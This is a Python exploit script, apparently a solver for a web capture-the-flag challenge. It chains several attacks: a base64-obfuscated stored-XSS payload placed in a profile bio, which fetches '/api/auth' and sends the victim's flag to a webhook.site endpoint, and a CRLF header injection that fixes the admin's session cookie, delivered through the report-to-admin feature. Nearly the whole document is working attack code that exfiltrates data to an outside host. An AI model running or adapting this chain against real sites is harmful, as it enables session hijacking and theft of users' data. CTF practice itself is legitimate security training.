import requests, sys, random, base64, time

if len(sys.argv) != 2:
    print("Usage: python3 solver.py host:port\n\nExample: python3 solver.py 127.0.0.1:1337")
    sys.exit(1)

hostURL = 'http://' + sys.argv[1]
userName = 'rayhan0x%d' % random.randint(1111,9999) # new username
userPwd = 'rayhan0x%d' % random.randint(1111,9999)   # new password

class WEBHOOK:
    def __init__(self):
        self.url = "http://webhook.site"
        try:
            resp = requests.post('{}/token'.format(self.url), json={"actions": True, "alias": "xss-poc", "cors": False}, timeout=15)
            self.token = resp.json()['uuid']
        except:
            print("[!] Couldn't reach webhook.site, please make sure we have internet access!")
            sys.exit()

    def get_flag(self):
        try:
            resp = requests.get('{}/token/{}/request/latest'.format(self.url,self.token), timeout=15)
            flag = resp.json()['query']['flag']
        except:
            return False
        return flag

    def destroy(self):
        requests.delete('{}/token/{}'.format(self.url,self.token), timeout=15)


def register():
    jData = { "username": userName, "email": userName + "@gmail.com", "password": userPwd }
    req_stat = requests.post("%s/api/register" % hostURL,json=jData).status_code
    if not req_stat == 201:
        print("Something went wrong! Is the challenge host live?")
        sys.exit()

def login():
    jData = { "username": userName, "password": userPwd }
    authCookie = requests.post("%s/api/login" % hostURL, json=jData).cookies.get('session')
    if not authCookie:
        print("Something went wrong while logging in!")
        sys.exit()
    return authCookie

def generate_xss_payload(webhook):
    exfilPayload = """
    fetch('/api/auth').then(res => res.json())
    .then(data => {
        new Image().src = '%s?flag=' + data.user.flag;
    })
    """ % webhook
    base64Payload = base64.b64encode(exfilPayload.encode('utf-8')).decode('utf-8')
    evalPayload = "<img src=1 onerror=eval(atob('{}'))>".format(base64Payload)
    return evalPayload

def update_profile(session, xss_payload):
    postData = {"username": userName, "email": userName + "@gmail.com", "bio": xss_payload}
    response = requests.post("%s/api/profile" % hostURL, json=postData, cookies={
        'session': session
    })

    if response.status_code != 200:
        print("Something went wrong while updating profile!")
        sys.exit()

def generate_crlf_payload(session):
    crlf_payload = "/invite/aaa%0D%0ASet-Cookie:%20session={};%20Path=/api/profile".format(session)
    return crlf_payload

def report_to_admin(session, crlf_payload):
    postData = {"postThread": crlf_payload, "reason": "I breathe JS"}
    response = requests.post("%s/api/report" % hostURL, json=postData, cookies={
        'session': session
    })

    if response.status_code != 200:
        print("Something went wrong while reporting to admin!")
        sys.exit()

def get_flag(session):
    requests.get("%s/api/flag" % hostURL, cookies=session)

def main():
    print('[+] Signing up a new account..')
    register()

    print('[+] Logging in..')
    session = login()

    print('[+] Generating webhook token..')
    webhook = WEBHOOK()
    webhookURL = webhook.url + '/' + webhook.token

    print('[+] Generating XSS payload..')
    XSSPayload = generate_xss_payload(webhookURL)

    print('[+] Updating profile bio with XSS payload..')
    update_profile(session, XSSPayload)

    print('[+] Generating session fixation CRLF payload..')
    CRLFPayload = generate_crlf_payload(session)

    print('[+] Reporting CRLF URI to the admin..')
    report_to_admin(session, CRLFPayload)

    print('[+] Waiting for flag to arrive on webhook..')
    while True:
        flag = webhook.get_flag()
        if flag:
            break
        time.sleep(3)

    print('[~] Flag arrived: {}'.format(flag))

    print('[~] Cleaning up the webhook')
    webhook.destroy()

if __name__ == "__main__":
    main()
